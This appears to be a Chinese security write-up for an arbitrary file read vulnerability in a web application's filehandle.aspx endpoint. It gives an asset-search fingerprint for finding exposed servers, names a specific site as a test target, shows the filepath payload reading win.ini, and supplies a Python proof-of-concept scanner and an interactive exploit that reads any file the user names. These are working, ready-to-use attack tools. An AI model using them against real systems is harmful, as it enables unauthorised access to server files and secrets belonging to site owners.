## 一、资产搜索

```
icon_hash="-642591392"
```

## 二、网站测试

```
http://tczb.hz-soft.cn
```

## 三、验证漏洞

```
/nssys/common/filehandle.aspx?filepath=C:/windows/win.ini
```

![image-20240914191525453](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914191525453.png)

## 四、POC

```
def poc(target):
    payload = "/nssys/common/filehandle.aspx?filepath=C:/windows/win.ini"
    try:
        res1 = requests.get(url=target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+payload,verify=False,timeout=5)
            if "fonts" in res2.text:
                with open("result.txt","a",encoding="utf-8") as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print(f"该网站[+]{target}有问题，请手动测试！！")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    while True:
        content = input("请输入要查看的路径，从C:目录开始输入(q退出)\n>>>>>>>>>>>>>>>>>>")
        payload = "/nssys/common/filehandle.aspx?filepath="
        res1 = requests.get(url=target, verify=False,timeout=5)
        if content == "q":
            exit()
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload +content, verify=False, timeout=5)
            print(res2.text)
        else:
            print("该文件不存在，请重新输入！！")
```

## 六、测试结果

![image-20240914191753106](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914191753106.png)

![image-20240914191824625](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240914191824625.png)